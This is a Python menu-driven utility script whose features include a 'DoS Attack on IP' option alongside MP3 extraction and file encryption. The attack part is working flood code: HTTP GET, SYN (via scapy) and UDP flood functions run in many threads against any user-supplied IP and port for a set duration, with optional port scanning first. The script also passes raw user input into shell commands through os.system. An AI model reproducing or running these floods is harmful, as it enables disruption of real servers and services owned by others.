import os
import socket
import threading
import random
import time
from cryptography.fernet import Fernet
import base64
from scapy.all import IP, TCP, send

numlist = ['1','2','3','4','5','6','7','8','9','0']
stat1 = False
stat2 = False
insettings = False
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/90.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

def encrypt_text(text, key):
    key = base64.urlsafe_b64encode(key.ljust(32, 'X').encode())
    cipher = Fernet(key)
    encrypted_text = cipher.encrypt(text.encode())
    return base64.urlsafe_b64encode(encrypted_text).decode()

def decrypt_text(encrypted_text_str, key):
    encrypted_text = base64.urlsafe_b64decode(encrypted_text_str.encode())
    key = base64.urlsafe_b64encode(key.ljust(32, 'X').encode())
    cipher = Fernet(key)
    return cipher.decrypt(encrypted_text).decode()

def http_flood(target_ip, target_port, time_limit):
    start_time = time.time()
    while time.time() - start_time < time_limit:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            user_agent = random.choice(USER_AGENTS)
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
            s.send(request.encode())
            s.close()
        except:
            pass

def syn_flood(target_ip, target_port, time_limit):
    start_time = time.time()
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    while time.time() - start_time < time_limit:
        try:
            send(packet, verbose=0)
        except:
            pass

def udp_flood(target_ip, target_port, time_limit):
    start_time = time.time()
    while time.time() - start_time < time_limit:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random._urandom(1024), (target_ip, target_port))
            s.close()
        except:
            pass

def start_attack(target_ip, target_port, time_limit, threads, attack_type):
    thread_list = []
    attack_methods = {
        "http": http_flood,
        "syn": syn_flood,
        "udp": udp_flood
    }
    attack_function = attack_methods.get(attack_type, http_flood)
    for _ in range(threads):
        thread = threading.Thread(target=attack_function, args=(target_ip, target_port, time_limit))
        thread.daemon = True
        thread.start()
        thread_list.append(thread)
    for thread in thread_list:
        thread.join()

os.system("cls" if os.name == "nt" else "clear")

print("""
\033[32m
 ______     __     __     ______     ______    
/\  == \   /\ \  _ \ \   /\  == \   /\___  \   
\ \  __<   \ \ \/ ".\ \  \ \  __<   \/_/  /__  
 \ \_____\  \ \__/".~\_\  \ \_\ \_\   /\_____\ 
  \/_____/   \/_/   \/_/   \/_/ /_/   \/_____/                                                                                                                                    
\033[0m
""")

print("\033[31mWARNING: RECOMMENDED TO RUN IN CMD, NOT POWERSHELL\033[0m")
print("""
▆▅▃▂▁𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬▁▂▃▅▆
╔═════════════════┃
║
╠═ 1. Extract MP3 from YouTube link
║
╠═ 2. DoS Attack on IP
║
╠═ 3. Encrypt a text file
║
╠═ 4. Decrypt the encrypted file
║
╠═ 5. Compress a file (HUFFMAN - NOT IMPLEMENTED YET)
║
╠═ 6. Decompress a file (HUFFMAN - NOT IMPLEMENTED YET)
║
╠═ 7. Settings
║     
╚═ 8. Exit
""")
print("░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░\n")

while True:
    try:
        option = int(input("Select an option: "))
        
        if option == 8:
            print("\nBye")
            break
        
        elif option == 1 and insettings == False:
            link = input("\nEnter link: ")
            os.system(f".\helpers\mp3.exe {link}")
            break
        elif option == 1 and insettings == True:
            if stat1 == False:
                stat1 = True
                os.system("cls")
                print(f"""
▆▅▃▂▁𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬▁▂▃▅▆
╔═════════════════┃
║
╠═ 1. Use threaded port scanning (recommended)      {stat1}
║
╠═ 2. Green text                                    {stat2}
║
╚═ 3. Exit settings
""")
            else:
                stat1 = False
                os.system("cls")
                print(f"""
▆▅▃▂▁𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬▁▂▃▅▆
╔═════════════════┃
║
╠═ 1. Use threaded port scanning (recommended)      {stat1}
║
╠═ 2. Green text                                    {stat2}
║
╚═ 3. Exit settings
""")
        elif option == 2:
            target_ip = input("\nEnter IP address: ")
            sfp = input("\nDo you want to scan for open ports? (y/n): ").lower()
            if sfp == "y":
                if stat1 == True:
                    os.system(f"\npython .\\helpers\\thpscan.py {target_ip}")
                else:
                    os.system(f"python .\\helpers\\pscan.py {target_ip}")
            target_port = int(input("\nEnter port: "))
            if target_port < 1 or target_port > 65535:
                print("Invalid port!")
                break
            time_limit = int(input("\nEnter attack duration (seconds): "))
            threads = int(input("\nEnter number of threads the attack should use: "))
            if threads > 120:
                print("Number of threads too high. Setting to 20.")
                threads = 20
            attack_type = input("\nEnter attack type (http/syn/udp): ").lower()
            if attack_type not in ["http", "syn", "udp"]:
                print("Invalid attack type. Defaulting to HTTP flood.")
                attack_type = "http"
            print("Starting attack...")
            start_attack(target_ip, target_port, time_limit, threads, attack_type)
            print("Attack completed.")
            break

        elif option == 3 and insettings == False:
            filename = input("Enter the file to encrypt: ")
            with open(filename, "r") as f:
                text = f.read()
            print("\n\033[31mWARNING: THE KEY WILL NOT BE SAVED LOCALLY\033[0m\n")
            manualorpregenerated = input("Use a pregenerated key? (y/n): ").lower()
            key = ''.join(random.choices(numlist, k=32)) if manualorpregenerated == "y" else input("\nEnter your 32-digit key: ")
            if manualorpregenerated == "y" and input("\nSave the key locally anyways? (y/n): ").lower() == "y":
                with open("key.txt", "w") as keyfile:
                    keyfile.write(key)
                print("Key saved as key.txt")
            enc_filename = f"encrypted_{filename}"
            with open(enc_filename, "w") as enc:
                enc.write(encrypt_text(text, key))
            print(f"\nEncrypted file created: {enc_filename}")
            break
        elif option == 3 and insettings == True:
            insettings = False
            os.system("cls")
            print("""
\033[32m
 ______     __     __     ______     ______    
/\  == \   /\ \  _ \ \   /\  == \   /\___  \   
\ \  __<   \ \ \/ ".\ \  \ \  __<   \/_/  /__  
 \ \_____\  \ \__/".~\_\  \ \_\ \_\   /\_____\ 
  \/_____/   \/_/   \/_/   \/_/ /_/   \/_____/                                                                                                                                    
\033[0m
""")

            print("\033[31mWARNING: RECOMMENDED TO RUN IN CMD, NOT POWERSHELL\033[0m")
            print("""
▆▅▃▂▁𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬▁▂▃▅▆
╔═════════════════┃
║
╠═ 1. Extract MP3 from YouTube link
║
╠═ 2. DoS Attack on IP
║
╠═ 3. Encrypt a text file
║
╠═ 4. Decrypt the encrypted file
║
╠═ 5. Compress a file (HUFFMAN - NOT IMPLEMENTED YET)
║
╠═ 6. Decompress a file (HUFFMAN - NOT IMPLEMENTED YET)
║
╠═ 7. Settings
║     
╚═ 8. Exit
""")
            print("░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░\n")
        
        elif option == 4:
            filename = input("Enter the file to decrypt: ")
            with open(filename, "r") as f:
                text = f.read()
            key = input("\nEnter your 32-digit key: ")
            dec_filename = f"decrypted_{filename}"
            with open(dec_filename, "w") as dec:
                dec.write(decrypt_text(text, key))
            print(f"\nDecrypted file created: {dec_filename}")
            break
        
        elif option == 5:
            print("\nHUFFMAN COMPRESSION NOT IMPLEMENTED YET")
            break
        
        elif option == 6:
            print("\nHUFFMAN DECOMPRESSION NOT IMPLEMENTED YET")
            break
        
        elif option == 7:
            os.system("cls")
            insettings = True
            print(f"""
▆▅▃▂▁𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬▁▂▃▅▆
╔═════════════════┃
║
╠═ 1. Use threaded port scanning (recommended)      {stat1}
║
╠═ 2. Green text                                    {stat2}
║
╚═ 3. Exit settings
""")
            

    except ValueError:
        print("\nInvalid input.\n")